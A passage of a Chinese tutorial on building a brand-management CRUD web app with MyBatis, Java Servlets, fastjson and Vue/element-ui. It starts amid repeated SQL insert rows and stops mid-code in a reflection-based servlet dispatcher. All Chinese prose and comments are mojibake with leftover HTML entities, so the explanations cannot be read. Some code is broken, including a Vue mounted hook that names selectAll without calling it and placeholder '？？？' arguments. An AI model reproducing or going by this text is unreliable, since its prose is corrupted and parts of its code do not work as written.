(&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;æ ¼åŠ›&#x27;, &#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 30, &#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;, 1), (&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;, 10, &#x27;ä¹°ä¹°ä¹°&#x27;, 1), (&#x27;è…¾è®¯&#x27;, &#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;, 50, &#x27;ç©ç©ç©&#x27;, 0), (&#x27;ç™¾åº¦&#x27;, &#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;, 5, &#x27;æœæœæœ&#x27;, 0), (&#x27;äº¬ä¸œ&#x27;, &#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;, 40, &#x27;å°±æ˜¯å¿«&#x27;, 1), (&#x27;åä¸º&#x27;, &#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;, 100, &#x27;ä¸‡ç‰©äº’è”&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;æ ¼åŠ›&#x27;, &#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 30, &#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;, 1), (&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;, 10, &#x27;ä¹°ä¹°ä¹°&#x27;, 1), (&#x27;è…¾è®¯&#x27;, &#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;, 50, &#x27;ç©ç©ç©&#x27;, 0), (&#x27;ç™¾åº¦&#x27;, &#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;, 5, &#x27;æœæœæœ&#x27;, 0), (&#x27;äº¬ä¸œ&#x27;, &#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;, 40, &#x27;å°±æ˜¯å¿«&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;ä¸‰åªæ¾é¼ &#x27;, &#x27;ä¸‰åªæ¾é¼ è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 5, &#x27;å¥½åƒä¸ä¸Šç«&#x27;, 0), (&#x27;åä¸º&#x27;, &#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;, 100, &#x27;ä¸‡ç‰©äº’è”&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;æ ¼åŠ›&#x27;, &#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 30, &#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;, 1), (&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;, 10, &#x27;ä¹°ä¹°ä¹°&#x27;, 1), (&#x27;è…¾è®¯&#x27;, &#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;, 50, &#x27;ç©ç©ç©&#x27;, 0), (&#x27;ç™¾åº¦&#x27;, &#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;, 5, &#x27;æœæœæœ&#x27;, 0), (&#x27;äº¬ä¸œ&#x27;, &#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;, 40, &#x27;å°±æ˜¯å¿«&#x27;, 1), (&#x27;åä¸º&#x27;, &#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;, 100, &#x27;ä¸‡ç‰©äº’è”&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;æ ¼åŠ›&#x27;, &#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 30, &#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;, 1), (&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;, 10, &#x27;ä¹°ä¹°ä¹°&#x27;, 1), (&#x27;è…¾è®¯&#x27;, &#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;, 50, &#x27;ç©ç©ç©&#x27;, 0), (&#x27;ç™¾åº¦&#x27;, &#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;, 5, &#x27;æœæœæœ&#x27;, 0), (&#x27;äº¬ä¸œ&#x27;, &#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;, 40, &#x27;å°±æ˜¯å¿«&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;ä¸‰åªæ¾é¼ &#x27;, &#x27;ä¸‰åªæ¾é¼ è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 5, &#x27;å¥½åƒä¸ä¸Šç«&#x27;, 0), (&#x27;åä¸º&#x27;, &#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;, 100, &#x27;ä¸‡ç‰©äº’è”&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;æ ¼åŠ›&#x27;, &#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 30, &#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;, 1), (&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;, 10, &#x27;ä¹°ä¹°ä¹°&#x27;, 1), (&#x27;è…¾è®¯&#x27;, &#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;, 50, &#x27;ç©ç©ç©&#x27;, 0), (&#x27;ç™¾åº¦&#x27;, &#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;, 5, &#x27;æœæœæœ&#x27;, 0), (&#x27;äº¬ä¸œ&#x27;, &#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;, 40, &#x27;å°±æ˜¯å¿«&#x27;, 1); 2.3 é…ç½®ä¿¡æ¯mybatiså°†mybatisçš„é…ç½®æ–‡ä»¶mybatis-config.xmlcopyåˆ°src/main/resourceç›®å½•ä¸‹ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt; &lt;configuration&gt; &lt;typeAliases&gt; &lt;package name=&quot;com.itheima.pojo&quot;/&gt; &lt;/typeAliases&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;!-- é…ç½®æ•°æ®å javastudy ç”¨æˆ·åå’Œå¯†ç --&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///javastudy?useSSL=false&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;!--æ‰«æmapper è¿™é‡Œæ ¹æ®é¡¹ç›®çš„mapperç›®å½•é…ç½®--&gt; &lt;package name=&quot;com.itheima.mapper&quot;/&gt; &lt;/mappers&gt; &lt;/configuration&gt; mavenpom.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;brand-case&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!--webé¡¹ç›®å°†æ‰“åŒ…æˆwaræ ¼å¼ æ™®é€šé¡¹ç›®åˆ™ä¸ºjar --&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!--Servlet--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!--MyBatisä¾èµ–--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--MySQL--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.34&lt;/version&gt; &lt;/dependency&gt; &lt;!--fastjson jsonè½¬objectæ—¶ç”¨åˆ°--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.62&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;!-- è¿™é‡Œå¯ä»¥é…ç½®tomcatçš„portå’Œæ ¹è·¯å¾„ --&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; åŒ…åœ¨/scr/main/javaä¸­æ–°å»ºpojoã€mapperã€serviceã€webã€utilç­‰åŒ… åŒ…å ä½œç”¨ pojo å­˜æ”¾å®ä½“ç±»ï¼Œæ¯”å¦‚Brandã€Userç­‰ mapper å­˜æ”¾å¯¹åº”çš„Mapperæ¥å£ æ¯”å¦‚BrandMapper service å­˜æ”¾æä¾›æœåŠ¡çš„ç±»BrandService web å­˜æ”¾webå±‚ä½¿ç”¨åˆ°çš„Servlet util å­˜æ”¾å·¥å…·åŒ… åˆ›å»ºsrc/main/resources/com/itheima/mapper/ç›®å½•ï¼Œè¯¥ç›®å½•å­˜æ”¾BrandMapper.xml è¯¥æ–‡ä»¶åœ¨tomcatå¯åŠ¨åè‡ªåŠ¨ä¿å­˜åˆ°src/main/java/com/itheima/mapper/BrandMapper.xml å‰ç«¯é¡µé¢ç™»å½•å’Œæ³¨å†Œé¡µé¢ä½¿ç”¨htmlå’Œjavascriptè®¾è®¡ å±•ç¤ºé¡µé¢ä½¿ç”¨Vueå’Œelement-uiè®¾è®¡å‡ºä¸€ä¸ªç®€å•çš„å±•ç¤ºé¡µé¢ åŠŸèƒ½å®ç°1.æŸ¥è¯¢æ‰€æœ‰éœ€æ±‚åˆ†æ å½“é¡µé¢åŠ è½½å®Œæˆåï¼Œæ•°æ®éœ€è¦å±•ç¤ºåˆ°å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦åœ¨Vueä¸­mountedæ„é€ å‡½æ•°ä¸­å†™å‘é€å¼‚æ­¥è¯·æ±‚çš„ä»£ç  å¹¶ä¸”å‘é€è¯·æ±‚æ—¶æ— éœ€æºå¸¦å‚æ•° æœåŠ¡å™¨è¿”å›æ‰€æœ‰æ•°æ®ï¼Œå…¶æ ¼å¼ä¸ºjsonæ ¼å¼ï¼Œè¿”å›çš„å‚æ•°ç»‘å®šåˆ°vueçš„æ¨¡å‹ä¸­ï¼Œæ˜¾ç¤ºåˆ°é¡µé¢ä¸­ åç«¯å®ç°daoåœ¨com.itheima.mapper.BrandMapperæ¥å£ä¸­æ·»åŠ selectAll()æ–¹æ³• /** * æŸ¥è¯¢æ‰€æœ‰ * @return */ @Select(&quot;select * from tb_brand&quot;) @ResultMap(&quot;brandResultMap&quot;) List&lt;Brand&gt; selectAll(); ç”±äºè¡¨ä¸­æœ‰äº›å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åæ²¡æœ‰å¯¹åº”ï¼Œæ‰€ä»¥éœ€è¦åœ¨ com/itheima/mapper/BrandMapper.xml æ˜ å°„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ç»“æœæ˜ å°„ ï¼Œä½¿ç”¨resultMap æ ‡ç­¾ã€‚æ˜ å°„é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š &lt;resultMap id=&quot;brandResultMap&quot; type=&quot;brand&quot;&gt; &lt;result property=&quot;brandName&quot; column=&quot;brand_name&quot;/&gt; &lt;result property=&quot;companyName&quot; column=&quot;company_name&quot;/&gt; &lt;/resultMap&gt; serviceåœ¨com.itheima.mapperä¸­åˆ›å»ºBrandServiceç±» // è·å–sqlSessionFactory // è¯¥ç±» å­˜æ”¾åœ¨utilåŒ…ä¸­ï¼Œå°è£…åæ–¹ä¾¿ä½¿ç”¨ SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory(); /** * æŸ¥è¯¢æ‰€æœ‰ * @return */ public List&lt;Brand&gt; selectAll()&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); // è·å– BrandMapper BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); // è°ƒç”¨æ–¹æ³• List&lt;Brand&gt; brands = mapper.selectAll(); sqlSession.close(); // è¿”å›æŸ¥è¯¢åˆ°çš„æ•°æ® return brands; &#125; servletåœ¨com.itheima.webä¸­åˆ›å»ºSelectAllServletå¯ä»¥ä½¿ç”¨Ideaæä¾›çš„æ¨¡æ¿åˆ›å»ºè‡ªåŠ¨ç»§æ‰¿HttpServlet package com.itheima.web.servlet; import com.alibaba.fastjson.JSON; import com.itheima.pojo.Brand; import com.itheima.service.BrandService; import jdk.nashorn.internal.ir.CallNode; import javax.servlet.*; import javax.servlet.http.*; import javax.servlet.annotation.*; import java.io.IOException; import java.util.List; @WebServlet(value = &quot;/selectAllServlet&quot;) public class SelectAllServlet extends HttpServlet &#123; // åˆ›å»ºBrandService private BrandService service = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // è°ƒç”¨BrandServiceä¸­çš„selectAllæ–¹æ³• List&lt;Brand&gt; brandList = service.selectAll(); // å°†brandå¯¹è±¡è½¬æ¢ä¸ºjsonå­—ç¬¦ä¸² String string = JSON.toJSONString(brandList); // è®¾ç½®å“åº”æ•°æ®ç±»å‹ä¸ºjson response.setContentType(&quot;text/json;charset=utf-8&quot;); //å“åº”æ•°æ® response.getWriter().write(string); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; å‰ç«¯å®ç°å‰ç«¯éœ€è¦åœ¨é¡µé¢åŠ è½½å®Œæ¯•åå‘é€ ajax è¯·æ±‚ï¼Œæ‰€ä»¥å‘é€è¯·æ±‚çš„é€»è¾‘åº”è¯¥æ”¾åœ¨ mounted() é’©å­å‡½æ•°ä¸­ã€‚è€Œå“åº”å›æ¥çš„æ•°æ®éœ€è¦èµ‹å€¼ç»™è¡¨æ ¼ç»‘å®šçš„æ•°æ®æ¨¡å‹ï¼Œä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºè¡¨æ ¼ç»‘å®šçš„æ•°æ®æ¨¡å‹æ˜¯ brandlist &lt;!--è¡¨æ ¼--&gt; &lt;template&gt; &lt;el-table :data=&quot;brandlist&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot; @selection-change=&quot;handleSelectionChange&quot; &gt; ajaxè¯·æ±‚ä¸º methods:&#123; selectAll()&#123; var _this = this; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27; &#125;).then(function(response)&#123; var brandlist = response.data; _this.brandlist = brandlist; &#125;) &#125; &#125; mounted()&#123; this.selectAll; &#125; 2.æ·»åŠ åŠŸèƒ½éœ€æ±‚åˆ†æ ç”¨æˆ·è¯·æ±‚åå°æ—¶éœ€è¦æºå¸¦æ•°æ®ï¼Œä¸”ä¸ºpostè¯·æ±‚ï¼Œæºå¸¦çš„æ•°æ®ç±»å‹ä¸ºjsonç±»å‹ åç«¯æœåŠ¡å™¨è·å–jsonæ•°æ®åå°†å…¶è½¬æ¢ä¸ºBrandç±»å‹ æ·»åŠ æˆåŠŸåå“åº”å‰ç«¯ åç«¯å®ç°daoåœ¨BrandMapperä¸­æ·»åŠ addBrand()æ–¹æ³• /** * æ·»åŠ  * @param brand */ @Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;) void addBrand(Brand brand); serviceåœ¨BrandServiceä¸­å®ç°addBrand()ä¸šåŠ¡é€»è¾‘æ–¹æ³• /** * æ·»åŠ  * @param brand */ public void addBrand(Brand brand)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.addBrand(brand); // å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹ è®°å¾—æäº¤äº‹åŠ¡ sqlSession.commit(); sqlSession.close(); &#125; servletå‰ç«¯è¯·æ±‚æ—¶æºå¸¦jsonæ•°æ®ï¼Œrequest.getParamter()æ— æ³•è·å–ï¼Œéœ€è¦ä½¿ç”¨è·å–è¯·æ±‚ä½“çš„æ–¹æ³•request.getReader() package com.itheima.web.servlet; import com.alibaba.fastjson.JSON; import com.itheima.pojo.Brand; import com.itheima.service.BrandService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.util.List; @WebServlet(value = &quot;/addServlet&quot;) public class AddServlet extends HttpServlet &#123; private BrandService service = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // getParamteræ— æ³•è·å–jsonæ•°æ® BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); // å°†jsonæ•°æ®è½¬æ¢ä¸ºBrandå¯¹è±¡ Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); service.addBrand(brand); // è¿”å›çš„å“åº”æ•°æ® response.getWriter().write(&quot;success&quot;); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; å‰ç«¯å®ç°æ·»åŠ çš„å¯¹è¯æ¡† åˆå§‹æ—¶è¯¥å¯¹è¯æ¡†ä¸ºéšè—çŠ¶æ€ï¼Œå…¶çŠ¶æ€æœ‰dialogVisibleæ§åˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºfalse &lt;el-dialog title=&quot;æ·»åŠ å“ç‰Œ&quot; :visible.sync=&quot;dialogVisible&quot; width=&quot;30%&quot; &gt; å½“ç‚¹å‡»æ·»åŠ æŒ‰é’®æ—¶ï¼Œå°†dialogVisibleè®¾ç½®ä¸ºtrueï¼Œå¯¹è¯æ¡†å¼¹å‡ºï¼Œä¾¿å¯ä»¥ç¼–è¾‘æ•°æ® &lt;el-button type=&quot;primary&quot; plain @click=&quot;dialogVisible = true&quot;&gt;æ–°å¢&lt;/el-button&gt; æäº¤æ•°æ®å¯¹è¯æ¡†å®é™…ä¸Šæ˜¯ä¸€ä¸ªformè¡¨å•ï¼Œè¯¥è¡¨å•æ•°æ®ä¸brandæ¨¡å‹ç»‘å®šï¼Œæ‰€ä»¥è¯·æ±‚åç«¯æ—¶æäº¤brandå³å¯ new Vue(&#123; data()&#123; return &#123; // å“ç‰Œæ¨¡å‹æ•°æ® brand: &#123; status: &#x27;&#x27;, brandName: &#x27;&#x27;, companyName: &#x27;&#x27;, id:&quot;&quot;, ordered:&quot;&quot;, description:&quot;&quot; &#125;, &#125; &#125; &#125;) æäº¤å’Œå–æ¶ˆæŒ‰é’® &lt;el-button type=&quot;primary&quot; @click=&quot;addBrand&quot;&gt;æäº¤&lt;/el-button&gt; &lt;!--å–æ¶ˆ åªéœ€è¦å°†dialogVisbleè®¾ç½®ä¸ºfalseå³å¯éšè—å¯¹è¯æ¡†--&gt; &lt;el-button @click=&quot;dialogVisible = false&quot;&gt;å–æ¶ˆ&lt;/el-button&gt; addBrand // æ·»åŠ æ•°æ® addBrand()&#123; var _this = this; this.currentPage=1 axios(&#123; method: &#x27;post&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/add&#x27;, data: brand = _this.brand &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // éšè—å¯¹è¯æ¡† _this.dialogVisible = false; // é‡æ–°åŠ è½½å…¨éƒ¨æ•°æ® _this.selectAll(); _this.msgbox(&quot;æ·»åŠ æˆåŠŸï¼&quot;); &#125; &#125;) &#125; Servletä¼˜åŒ–===Web å±‚çš„ Servlet ä¸ªæ•°å¤ªå¤šäº†ï¼Œä¸åˆ©äºç®¡ç†å’Œç¼–å†™=== é€šè¿‡ä¹‹å‰çš„ä¸¤ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å‘ç°æ¯ä¸€ä¸ªåŠŸèƒ½éƒ½éœ€è¦å®šä¹‰ä¸€ä¸ª servletï¼Œä¸€ä¸ªæ¨¡å—éœ€è¦å®ç°å¢åˆ æ”¹æŸ¥åŠŸèƒ½ï¼Œå°±éœ€è¦4ä¸ª servletï¼Œæ¨¡å—ä¸€å¤šå°±ä¼šé€ æˆservlet æ³›æ»¥ã€‚æ­¤æ—¶æˆ‘ä»¬å°±æƒ³ servlet èƒ½ä¸èƒ½åƒ service ä¸€æ ·ï¼Œä¸€ä¸ªæ¨¡å—åªå®šä¹‰ä¸€ä¸ª servletï¼Œè€Œæ¯ä¸€ä¸ªåŠŸèƒ½åªéœ€è¦åœ¨è¯¥ servlet ä¸­å®šä¹‰å¯¹åº”çš„æ–¹æ³•ã€‚ä¾‹å¦‚ä¸‹é¢ä»£ç ï¼š @WebServlet(&quot;/brand/*&quot;) public class BrandServlet &#123; //æŸ¥è¯¢æ‰€æœ‰ public void selectAll(...) &#123;&#125; //æ·»åŠ æ•°æ® public void add(...) &#123;&#125; //ä¿®æ”¹æ•°æ® public void update(...) &#123;&#125; //åˆ é™¤åˆ é™¤ public void delete(...) &#123;&#125; &#125; è€Œæˆ‘ä»¬çŸ¥é“å‘é€è¯·æ±‚ servletï¼Œtomcat ä¼šè‡ªåŠ¨çš„è°ƒç”¨ service() æ–¹æ³•ï¼Œä¹‹å‰æˆ‘ä»¬åœ¨è‡ªå®šä¹‰çš„ servlet ä¸­é‡å†™ doGet() æ–¹æ³•å’Œ doPost() æ–¹æ³•ï¼Œå½“æˆ‘ä»¬è®¿é—®è¯¥ servlet æ—¶ä¼šæ ¹æ®è¯·æ±‚æ–¹å¼å°†è¯·æ±‚åˆ†å‘ç»™ doGet() æˆ–è€… doPost() æ–¹æ³• é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¿ç…§è¿™æ ·è¯·æ±‚åˆ†å‘çš„æ€æƒ³ï¼Œåœ¨ service() æ–¹æ³•ä¸­æ ¹æ®å…·ä½“çš„æ“ä½œè°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œå¦‚ï¼šæŸ¥è¯¢æ‰€æœ‰å°±è°ƒç”¨ selectAll() æ–¹æ³•ï¼Œæ·»åŠ ä¼ä¸šä¿¡æ¯å°±è°ƒç”¨ add() æ–¹æ³•ã€‚ ä¸ºäº†åšåˆ°é€šç”¨ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªé€šç”¨çš„ servlet ç±»ï¼Œåœ¨å®šä¹‰å…¶ä»–çš„ servlet æ˜¯ä¸éœ€è¦ç»§æ‰¿ HttpServletï¼Œè€Œç»§æ‰¿æˆ‘ä»¬å®šä¹‰çš„ BaseServletï¼Œåœ¨BaseServlet ä¸­è°ƒç”¨å…·ä½“ servletï¼ˆå¦‚BrandServletï¼‰ä¸­çš„å¯¹åº”æ–¹æ³•ã€‚ public class BaseServlet extends HttpServlet &#123; @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //è¿›è¡Œè¯·æ±‚çš„åˆ†å‘ &#125; &#125; BrandServlet å®šä¹‰å°±éœ€è¦ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š @WebServlet(&quot;/brand/*&quot;) public class BrandServlet extends BaseServlet &#123; //ç”¨æˆ·å®ç°åˆ†é¡µæŸ¥è¯¢ public void selectAll(...) &#123;&#125; //æ·»åŠ ä¼ä¸šä¿¡æ¯ public void add(...) &#123;&#125; //ä¿®æ”¹ä¼ä¸šä¿¡æ¯ public void update(...) &#123;&#125; //åˆ é™¤ä¼ä¸šä¿¡æ¯ public void delete(...) &#123;&#125; &#125; é‚£ä¹ˆå¦‚ä½•åœ¨ BaseServlet ä¸­è°ƒç”¨å¯¹åº”çš„æ–¹æ³•å‘¢ï¼Ÿæ¯”å¦‚æŸ¥è¯¢æ‰€æœ‰å°±è°ƒç”¨ selectAll() æ–¹æ³•ã€‚ å¯ä»¥==è§„å®šåœ¨å‘é€è¯·æ±‚æ—¶ï¼Œè¯·æ±‚èµ„æºçš„äºŒçº§è·¯å¾„ï¼ˆ/brandServlet/selectAllï¼‰å’Œéœ€è¦è°ƒç”¨çš„æ–¹æ³•åç›¸åŒ==ï¼Œå¦‚ï¼š æŸ¥è¯¢æ‰€æœ‰æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š http://localhost:8080/brand-case/brandServlet/selectAll æ·»åŠ æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š http://localhost:8080/brand-case/brandServlet/add ä¿®æ”¹æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š http://localhost:8080/brand-case/brandServlet/update åˆ é™¤æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š http://localhost:8080/brand-case/brandServlet/delete è¿™æ ·çš„è¯ï¼Œåœ¨ BaseServlet ä¸­å°±éœ€è¦è·å–åˆ°èµ„æºçš„äºŒçº§è·¯å¾„ä½œä¸ºæ–¹æ³•åï¼Œç„¶åè°ƒç”¨è¯¥æ–¹æ³• public class BaseServlet extends HttpServlet &#123; @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //1. è·å–è¯·æ±‚è·¯å¾„ String uri = req.getRequestURI(); // ä¾‹å¦‚è·¯å¾„ä¸ºï¼š/brand-case/brand/selectAll //2. è·å–æœ€åä¸€æ®µè·¯å¾„ï¼Œæ–¹æ³•å int index = uri.lastIndexOf(&#x27;/&#x27;); String methodName = uri.substring(index + 1); // è·å–åˆ°èµ„æºçš„äºŒçº§è·¯å¾„ selectAll //2. æ‰§è¡Œæ–¹æ³• //2.1 è·å–BrandServlet /UserServlet å­—èŠ‚ç å¯¹è±¡ Class //System.out.println(this); Class&lt;? extends BaseServlet&gt; cls = this.getClass(); //2.2 è·å–æ–¹æ³• Methodå¯¹è±¡ try &#123; Method method = cls.getMethod(methodName,ï¼Ÿï¼Ÿï¼Ÿ); //4,è°ƒç”¨è¯¥æ–¹æ³• method.invoke(this,ï¼Ÿï¼Ÿï¼Ÿ); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) 